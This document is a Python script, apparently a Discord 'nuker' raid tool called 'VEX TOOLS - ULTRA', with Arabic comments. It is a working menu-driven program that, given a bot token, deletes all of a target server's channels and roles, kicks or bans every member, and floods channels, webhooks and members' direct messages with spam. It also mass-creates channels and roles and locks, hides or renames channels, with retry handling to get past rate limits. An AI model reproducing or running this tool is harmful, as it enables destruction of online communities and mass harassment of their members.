import discord
import asyncio
import sys
import os
import logging
import aiohttp
from discord.ui import Button, View
from colorama import Fore, Style, init

# إعدادات الألوان والكتم الكامل
init(autoreset=True)
logging.basicConfig(level=logging.CRITICAL)
for log_name in ['discord', 'discord.http', 'discord.gateway', 'aiohttp.client']:
    logging.getLogger(log_name).setLevel(logging.CRITICAL)

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

async def slow_print(text, delay=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        await asyncio.sleep(delay)
    print()

async def get_input(prompt):
    print(prompt, end='', flush=True)
    return await asyncio.to_thread(input)

async def get_int(prompt):
    while True:
        val = await get_input(prompt)
        if val.isdigit(): return int(val)
        print(f"{Fore.CYAN}[!] Please enter a valid number.")

# محرك السرعة الفائق مع معالجة الـ Rate Limit (Anti-429)
async def speed_worker(coro):
    try:
        await coro
    except discord.errors.HTTPException as e:
        if e.status == 429: # في حال الحظر المؤقت
            retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
            await asyncio.sleep(retry_after)
            try: await coro
            except: pass
    except:
        pass

BANNER = f"""
{Fore.CYAN}{Style.BRIGHT}     ██╗         ██╗  {Fore.WHITE}╔═════════════════════════════════════════╗
{Fore.CYAN}{Style.BRIGHT}     ╚██╗       ██╔╝  {Fore.WHITE}║ {Fore.GREEN}VEX TOOLS - ULTRA                  {Fore.WHITE}║
{Fore.CYAN}{Style.BRIGHT}      ╚██╗     ██╔╝   {Fore.WHITE}║ {Fore.CYAN}DEVELOPER: VEX                          {Fore.WHITE}║
{Fore.CYAN}{Style.BRIGHT}       ╚██╗   ██╔╝    {Fore.WHITE}╚═════════════════════════════════════════╝
{Fore.CYAN}{Style.BRIGHT}        ╚██╗ ██╔╝     {Fore.BLACK}{Style.BRIGHT}[ PRIVATE SECURE ENGINE - ONLINE ]
{Fore.CYAN}{Style.BRIGHT}         ╚████╔╝      
{Fore.CYAN}{Style.BRIGHT}          ╚═══╝       
"""

def setup_client():
    clear()
    print(BANNER)
    token = input(f"{Fore.WHITE}Input Bot Token > ")
    intents = discord.Intents.all()
    client = discord.Client(intents=intents)
    return client, token

client, token = setup_client()

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name="Vex On Top", url="https://twitch.tv/vex"))

    target_guild = None
    clear()
    print(BANNER)
    guilds = list(client.guilds)
    print(f"\n{Fore.GREEN}--- SELECT TARGET SERVER ---")
    for i, guild in enumerate(guilds):
        print(f"{Fore.CYAN}[{i}] {Fore.WHITE}{guild.name} ({guild.member_count})")
    
    idx = await get_int(f"\n{Fore.YELLOW}Target ID > ")
    try: target_guild = guilds[idx]
    except: await client.close(); return

    while True:
        clear()
        print(BANNER)
        print(f"{Fore.GREEN}Logged: {client.user} | Target: {target_guild.name}")
        print(f"{Fore.BLACK}{Style.BRIGHT}══════════════════════════════════════════════════════════════════════")
        print(f"{Fore.CYAN}1. Purge Channels   2. Purge Roles      3. Mass Roles      4. Setup Webhook")
        print(f"{Fore.CYAN}5. Global Spam      6. Kick All Members 7. Ban All Members 8. Mass Channels")
        print(f"{Fore.CYAN}9. Mass Webhook     10. Custom Webhook  11. DM All Members 12. Rename Server")
        print(f"{Fore.CYAN}13. Rename Channels 14. Lock All Chat   15. Hide All Chat  16. Show All Chat")
        print(f"{Fore.CYAN}17. Unban Everyone  18. Embed Spam      19. Change Icon    0. Terminate")
        print(f"{Fore.BLACK}{Style.BRIGHT}══════════════════════════════════════════════════════════════════════")
        
        cmd = await get_input(f"\n{Fore.GREEN}Command > ")

        if cmd == '1': # حذف الرومات
            tasks = [asyncio.create_task(speed_worker(ch.delete())) for ch in target_guild.channels]
            await asyncio.gather(*tasks)

        elif cmd == '2': # حذف الرتب
            roles = [r for r in target_guild.roles if r < target_guild.me.top_role and not r.is_default()]
            tasks = [asyncio.create_task(speed_worker(r.delete())) for r in roles]
            await asyncio.gather(*tasks)

        elif cmd == '3': # رتب لا نهائية
            count = await get_int("How many roles? > ")
            name = await get_input("Role Name > ")
            for _ in range(count): asyncio.create_task(speed_worker(target_guild.create_role(name=name)))

        elif cmd == '4': # سيت اب ويب هوك (مصلح)
            ch_id = await get_int("Channel ID > ")
            name = await get_input("Webhook Name > ")
            icon = await get_input("Icon URL (Enter to skip) > ")
            channel = client.get_channel(ch_id)
            if channel:
                img = None
                if icon.strip():
                    async with aiohttp.ClientSession() as s:
                        async with s.get(icon) as r: img = await r.read()
                webhook = await channel.create_webhook(name=name, avatar=img)
                print(f"{Fore.GREEN}[+] Webhook Created: {Fore.CYAN}{webhook.url}")
                await get_input("\nPress Enter to return...")

        elif cmd == '5': # سبام عام
            msg = await get_input("Message > "); count = await get_int("Amount > ")
            for ch in target_guild.text_channels:
                for _ in range(count): asyncio.create_task(speed_worker(ch.send(msg)))

        elif cmd == '6': # طرد الكل
            async for m in target_guild.fetch_members(limit=None):
                if m.id != client.user.id: asyncio.create_task(speed_worker(m.kick()))

        elif cmd == '7': # بان للكل
            async for m in target_guild.fetch_members(limit=None):
                if m.id != client.user.id: asyncio.create_task(speed_worker(m.ban()))

        elif cmd == '8': # رومات لا نهائية
            count = await get_int("Count > "); name = await get_input("Name > ")
            for _ in range(count): asyncio.create_task(speed_worker(target_guild.create_text_channel(name=name)))

        elif cmd == '10': # كوستوم ويب هوك (مصلح)
            url = await get_input("Webhook URL > ")
            msg = await get_input("Message > ")
            amt = await get_int("Amount > ")
            async with aiohttp.ClientSession() as session:
                for _ in range(amt):
                    asyncio.create_task(session.post(url, json={"content": msg}))
            print(f"{Fore.GREEN}[+] Webhook sending started...")
            await asyncio.sleep(1)

        elif cmd == '11': # خاص للكل (مصلح)
            msg = await get_input("DM Message > "); count = await get_int("Count > ")
            async for m in target_guild.fetch_members(limit=None):
                if not m.bot and m.id != client.user.id:
                    for _ in range(count):
                        asyncio.create_task(speed_worker(m.send(f"{m.mention} {msg}")))
                    print(f"{Fore.GREEN}send to: {m.display_name}")

        elif cmd == '12': # تغيير اسم السيرفر
            n = await get_input("New Name > "); await target_guild.edit(name=n)

        elif cmd == '13': # تغيير اسم الرومات
            n = await get_input("New Name > ")
            for ch in target_guild.channels: asyncio.create_task(speed_worker(ch.edit(name=n)))

        elif cmd == '14': # قفل الرومات
            for ch in target_guild.text_channels:
                asyncio.create_task(speed_worker(ch.set_permissions(target_guild.default_role, send_messages=False)))

        elif cmd == '15': # اخفاء الرومات
            for ch in target_guild.channels:
                asyncio.create_task(speed_worker(ch.set_permissions(target_guild.default_role, view_channel=False)))

        elif cmd == '16': # اظهار الرومات
            for ch in target_guild.channels:
                asyncio.create_task(speed_worker(ch.set_permissions(target_guild.default_role, view_channel=True)))

        elif cmd == '17': # فك البان عن الكل
            async for entry in target_guild.bans(limit=None):
                asyncio.create_task(speed_worker(target_guild.unban(entry.user)))

        elif cmd == '18': # ايمبد سبام (النسخة الكاملة)
            t = await get_input("Title > "); d = await get_input("Desc > ")
            c = await get_input("Color Hex > "); img = await get_input("Image URL > ")
            b_n = await get_input("Button Name > "); b_u = await get_input("Button URL > ")
            amt = await get_int("Amount > ")
            
            embed = discord.Embed(title=t, description=d, color=int(c, 16))
            if img.strip(): embed.set_image(url=img)
            
            for ch in target_guild.text_channels:
                view = View()
                view.add_item(Button(label=b_n, url=b_u, style=discord.ButtonStyle.secondary))
                for _ in range(amt): asyncio.create_task(speed_worker(ch.send(embed=embed, view=view)))

        elif cmd == '19': # تغيير صورة السيرفر
            url = await get_input("Icon URL > ")
            async with aiohttp.ClientSession() as s:
                async with s.get(url) as r: 
                    data = await r.read()
                    await target_guild.edit(icon=data)

        elif cmd == '0':
            await client.close(); break
        
        await asyncio.sleep(0.5)

try:
    client.run(token)
except Exception as e: print(f"{Fore.CYAN}[!] Error: {e}")